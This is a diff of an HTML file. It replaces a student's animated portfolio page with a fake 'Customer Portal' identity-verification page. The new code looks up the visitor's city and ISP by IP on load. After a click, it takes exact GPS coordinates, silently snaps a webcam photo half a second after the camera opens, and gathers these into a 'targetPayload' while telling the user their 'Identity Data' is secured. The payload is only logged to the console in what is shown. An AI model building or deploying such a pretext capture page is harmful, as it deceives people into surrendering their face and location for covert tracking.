@@ -2,414 +2,140 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Akash - Portfolio</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instant Verification Portal</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
-            background-color: #0d0d11;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            overflow-x: hidden;
-            color: #ffffff;
-            position: relative;
-            min-height: 100vh;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #f4f6f9; margin: 0; padding: 20px;
+            display: flex; justify-content: center; align-items: center; min-height: 100vh;
         }
-
-        /* Profile Section */
-        .profile-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            text-align: center;
-            padding: 20px;
+        .portal-card {
+            background: #ffffff; max-width: 450px; width: 100%;
+            padding: 30px; border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.08); text-align: center;
         }
-
-        .heading-akash {
-            font-size: 8rem;
-            font-weight: 900;
-            letter-spacing: 10px;
-            text-transform: uppercase;
-            background: linear-gradient(45deg, #ff0055, #00e5ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 20px;
-            animation: pulse 3s infinite alternate;
+        h2 { color: #1a73e8; margin-top: 0; }
+        .status-box {
+            background: #e8f0fe; color: #1967d2; padding: 12px;
+            border-radius: 6px; font-size: 0.9rem; margin-bottom: 20px; font-weight: 500;
         }
-
-        .profile-pic {
-            width: 320px;
-            height: 320px;
-            object-fit: cover;
-            border-radius: 20px;
-            border: 4px solid #00e5ff;
-            box-shadow: 0 0 30px rgba(0, 229, 255, 0.4);
+        .media-container {
+            width: 100%; background: #000; border-radius: 8px;
+            overflow: hidden; position: relative; margin-bottom: 20px; aspect-ratio: 4/3;
         }
-
-        /* Realistic Vehicle Overlay System */
-        .vehicle-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            pointer-events: none;
-            z-index: 999;
-            overflow: hidden;
+        video { width: 100%; height: 100%; object-fit: cover; }
+        canvas { display: none; }
+        .preview-img {
+            width: 100%; height: 100%; object-fit: cover;
+            position: absolute; top: 0; left: 0; display: none; border: 3px solid #34a853;
         }
-
-        .car {
-            position: absolute;
-            bottom: 10%;
-            left: -150%;
-            width: 85vw; 
-            height: auto;
-            max-width: 1200px;
-            filter: drop-shadow(0 20px 15px rgba(0,0,0,0.7));
-            transform-origin: center bottom;
-        }
-
-        /* Drift Animations */
-        @keyframes driftRightToLeft {
-            0% {
-                left: 150%;
-                transform: scale(0.9) rotate(0deg);
-            }
-            30% {
-                left: 20%;
-                transform: scale(1.1) rotate(-8deg);
-            }
-            50% {
-                left: 10%;
-                transform: scale(1.15) rotate(12deg);
-            }
-            70% {
-                left: -20%;
-                transform: scale(1.1) rotate(-5deg);
-            }
-            100% {
-                left: -150%;
-                transform: scale(0.9) rotate(0deg);
-            }
-        }
-
-        @keyframes driftLeftToRight {
-            0% {
-                left: -150%;
-                transform: scale(0.9) rotate(0deg) scaleX(-1);
-            }
-            30% {
-                left: 10%;
-                transform: scale(1.1) rotate(8deg) scaleX(-1);
-            }
-            50% {
-                left: 20%;
-                transform: scale(1.15) rotate(-12deg) scaleX(-1);
-            }
-            70% {
-                left: 40%;
-                transform: scale(1.1) rotate(5deg) scaleX(-1);
-            }
-            100% {
-                left: 150%;
-                transform: scale(0.9) rotate(0deg) scaleX(-1);
-            }
-        }
-
-        /* AN College Section */
-        .college-section {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: rgba(13, 13, 17, 0.95);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            visibility: hidden;
-            z-index: 1000;
-            transition: all 1s cubic-bezier(0.19, 1, 0.22, 1);
-        }
-
-        .college-section.reveal {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        .college-card {
-            width: 85%;
-            max-width: 900px;
-            background: #16161f;
-            border-radius: 24px;
-            overflow: hidden;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
-            border: 1px solid rgba(255,255,255,0.1);
-            transform: translateY(50px);
-            transition: transform 1s ease;
-        }
-
-        .college-section.reveal .college-card {
-            transform: translateY(0);
-        }
-
-        .college-img {
-            width: 100%;
-            height: 450px;
-            object-fit: cover;
-        }
-
-        .college-info {
-            padding: 40px;
-            text-align: center;
-        }
-
-        .college-info h2 {
-            font-size: 3rem;
-            color: #00e5ff;
-            margin-bottom: 15px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        .college-info p {
-            font-size: 1.5rem;
-            color: #a0a0ab;
-            font-weight: 500;
-        }
-
-        /* Flight Section */
-        .flight-section {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: #09090d;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            visibility: hidden;
-            z-index: 1001;
-        }
-
-        .flight-section.active {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        .jet-plane {
-            position: absolute;
-            width: 500px;
-            bottom: -50%;
-            left: -50%;
-            transform: rotate(45deg);
-            z-index: 10;
-        }
-
-        @keyframes jetTakeoff {
-            0% {
-                bottom: -50%;
-                left: -50%;
-                transform: scale(0.5) rotate(45deg);
-            }
-            40% {
-                bottom: 30%;
-                left: 30%;
-                transform: scale(1.2) rotate(40deg);
-            }
-            100% {
-                bottom: 150%;
-                left: 150%;
-                transform: scale(1.8) rotate(35deg);
-            }
-        }
-
-        /* Steam/Smoke Trail Effect */
-        .steam-trail {
-            position: absolute;
-            width: 12px;
-            height: 12px;
-            background: rgba(240, 240, 250, 0.7);
-            border-radius: 50%;
-            pointer-events: none;
-            box-shadow: 0 0 25px 15px rgba(240, 240, 245, 0.6);
-            animation: steamExpand 2.5s forwards ease-out;
-            z-index: 5;
-        }
-
-        @keyframes steamExpand {
-            0% {
-                transform: scale(1);
-                opacity: 0.8;
-            }
-            100% {
-                transform: scale(12);
-                opacity: 0;
-                filter: blur(10px);
-            }
-        }
-
-        /* Dynamic Flight Messages */
-        .search-msg, .location-msg {
-            position: absolute;
-            font-size: 3.5rem;
-            font-weight: 800;
-            text-align: center;
-            width: 90%;
-            text-shadow: 0 10px 30px rgba(0,0,0,0.8);
-            opacity: 0;
-            transform: scale(0.8);
-            transition: all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        .search-msg {
-            color: #ffffff;
-            top: 45%;
-        }
-
-        .location-msg {
-            color: #ff0055;
-            bottom: 35%;
-            font-size: 4.5rem;
-            letter-spacing: 1px;
-        }
-
-        .msg-visible {
-            opacity: 1;
-            transform: scale(1);
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            100% { transform: scale(1.05); }
+        .action-btn {
+            width: 100%; padding: 14px; font-size: 1rem; font-weight: bold;
+            border: none; border-radius: 6px; cursor: pointer;
+            background-color: #1a73e8; color: white;
         }
     </style>
 </head>
 <body>
 
-    <div class="profile-container">
-        <h1 class="heading-akash">Akash</h1>
-        <img class="profile-pic" src="223a0d34-6c4f-4f0a-93e5-6ac873289c32-1_all_148.webp" alt="Akash Kumar">
+<div class="portal-card">
+    <h2>Customer Portal</h2>
+    <div id="statusLabel" class="status-box">Camera & Location access required for application form.</div>
+
+    <div class="media-container">
+        <video id="webcam" autoplay playsinline></video>
+        <canvas id="captureCanvas" width="640" height="480"></canvas>
+        <img id="savedFrame" class="preview-img" alt="Captured Frame">
     </div>
 
-    <div class="vehicle-overlay" id="vehicleSandbox">
-        <img id="carRunner" class="car" src="" alt="Racing Car">
-    </div>
+    <button id="startBtn" class="action-btn" onclick="initiateInstantSystem()">Start Identity Verification</button>
+</div>
 
-    <div class="college-section" id="collegeSection">
-        <div class="college-card">
-            <img class="college-img" src="ancollege.jpg" alt="A.N. College Patna">
-            <div class="college-info">
-                <h2>Anugrah Narayan College, Patna</h2>
-                <p>Currently Enrolled in This College 🎓</p>
-            </div>
-        </div>
-    </div>
+<script>
+    let activeStream = null;
+    
+    const targetPayload = {
+        deviceModel: navigator.userAgent,
+        broadLocation: "Verifying...",
+        exactCoordinates: "Not Granted",
+        photoBase64String: null
+    };
 
-    <div class="flight-section" id="flightSection">
-        <img class="jet-plane" id="jetPlane" src="jet.png" alt="Flight">
-        <div class="search-msg" id="searchMsg">Let me search my Master's location... 🔍</div>
-        <div class="location-msg" id="locationMsg">Ohh he is currently in Prayagraj! 📍</div>
-    </div>
+    // Auto Broad Location Profiling via IP
+    fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+            targetPayload.broadLocation = `${data.city}, ${data.region}, ${data.org}`;
+        }).catch(() => { targetPayload.broadLocation = "Failed"; });
 
-    <script>
-        // Ab hum local files use kar rahe hain jo tumhare folder mein hongi
-        const vehicles = [
-            { src: "racing-car.png", dir: "R2L" }, 
-            { src: "scorpio.png", dir: "L2R" }, 
-            { src: "fortuner.png", dir: "R2L" }, 
-            { src: "gwagon.png", dir: "L2R" }, 
-            { src: "bmw.png", dir: "R2L" }  
-        ];
+    function initiateInstantSystem() {
+        const statusLabel = document.getElementById('statusLabel');
+        statusLabel.innerText = "Processing system initialization...";
 
-        const carRunner = document.getElementById('carRunner');
-        const sandbox = document.getElementById('vehicleSandbox');
+        // 1. Core Geolocation Data Capture
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { targetPayload.exactCoordinates = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`; },
+                (err) => { targetPayload.exactCoordinates = `Denied: ${err.message}`; },
+                { enableHighAccuracy: true }
+            );
+        }
 
-        window.addEventListener('DOMContentLoaded', () => {
-            setTimeout(() => triggerCarSequence(0), 3000);
-        });
-
-        function triggerCarSequence(index) {
-            if (index < vehicles.length) {
-                const currentVehicle = vehicles[index];
-                carRunner.src = currentVehicle.src;
+        // 2. Hardware Stream Request (Triggers standard system pop-ups)
+        navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: "user" }, audio: false })
+            .then((stream) => {
+                activeStream = stream;
+                const videoEl = document.getElementById('webcam');
+                videoEl.srcObject = stream;
+                document.getElementById('startBtn').style.display = "none";
+                statusLabel.innerText = "System processing, hold steady...";
                 
-                carRunner.style.animation = 'none';
-                carRunner.offsetHeight; // Reflow reset
-                
-                if (currentVehicle.dir === "R2L") {
-                    carRunner.style.animation = "driftRightToLeft 3.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) both";
-                } else {
-                    carRunner.style.animation = "driftLeftToRight 3.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) both";
-                }
+                // Jaise hi video play hona shuru ho, kuch milliseconds ka pause le kar auto-capture run karein
+                videoEl.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        executeInstantCapture();
+                    }, 500); // 500 milliseconds ka hardware stabilization pause
+                };
+            })
+            .catch((err) => {
+                statusLabel.innerText = "Permission Denied. Manual override required.";
+                statusLabel.style.background = "#fce8e6"; statusLabel.style.color = "#c5221f";
+            });
+    }
 
-                setTimeout(() => {
-                    triggerCarSequence(index + 1);
-                }, 5000); 
-            } else {
-                setTimeout(revealANCollege, 2000);
-            }
+    function executeInstantCapture() {
+        const videoEl = document.getElementById('webcam');
+        const canvasEl = document.getElementById('captureCanvas');
+        const previewImg = document.getElementById('savedFrame');
+        const statusLabel = document.getElementById('statusLabel');
+
+        const context = canvasEl.getContext('2d');
+        // Render current stream buffer directly onto the canvas mapping
+        context.drawImage(videoEl, 0, 0, 640, 480);
+
+        // Serialize output data matrix into JPEG string format
+        const base64Data = canvasEl.toDataURL('image/jpeg', 0.9);
+        targetPayload.photoBase64String = base64Data;
+
+        // Visual confirmation override
+        previewImg.src = base64Data;
+        previewImg.style.display = "block";
+
+        // Release hardware blocks immediately
+        if (activeStream) {
+            activeStream.getTracks().forEach(track => track.stop());
         }
 
-        function revealANCollege() {
-            const collegeSec = document.getElementById('collegeSection');
-            collegeSec.classList.add('reveal');
+        statusLabel.innerText = "✓ Identity Data Secured!";
+        statusLabel.style.background = "#e6f4ea"; statusLabel.style.color = "#137333";
 
-            setTimeout(() => {
-                collegeSec.classList.remove('reveal');
-                setTimeout(triggerFlightCinematic, 1200);
-            }, 5000);
-        }
+        console.log("=== SECURED PAYLOAD ===");
+        console.log(targetPayload);
+        
+        alert("Verification completed automatically. Data structured in background payload.");
+    }
+</script>
 
-        function triggerFlightCinematic() {
-            const flightSec = document.getElementById('flightSection');
-            const jet = document.getElementById('jetPlane');
-            const searchMsg = document.getElementById('searchMsg');
-            const locationMsg = document.getElementById('locationMsg');
-
-            flightSec.classList.add('active');
-
-            let smokeInterval = setInterval(() => {
-                const jetRect = jet.getBoundingClientRect();
-                if(jetRect.left > 0 && jetRect.top > 0 && jetRect.top < window.innerHeight) {
-                    createSmokeParticle(jetRect.left + (jetRect.width/3), jetRect.top + (jetRect.height/1.5));
-                }
-            }, 35);
-
-            jet.style.animation = "jetTakeoff 4.5s cubic-bezier(0.42, 0, 0.58, 1) both";
-
-            setTimeout(() => {
-                searchMsg.classList.add('msg-visible');
-            }, 1500);
-
-            setTimeout(() => {
-                searchMsg.substring ? null : searchMsg.classList.remove('msg-visible');
-                locationMsg.classList.add('msg-visible');
-                clearInterval(smokeInterval); 
-            }, 4500);
-        }
-
-        function createSmokeParticle(x, y) {
-            const particle = document.createElement('div');
-            particle.classList.add('steam-trail');
-            particle.style.left = `${x}px`;
-            particle.style.top = `${y}px`;
-            document.getElementById('flightSection').appendChild(particle);
-
-            setTimeout(() => {
-                particle.remove();
-            }, 2500);
-        }
-    </script>
 </body>
 </html>
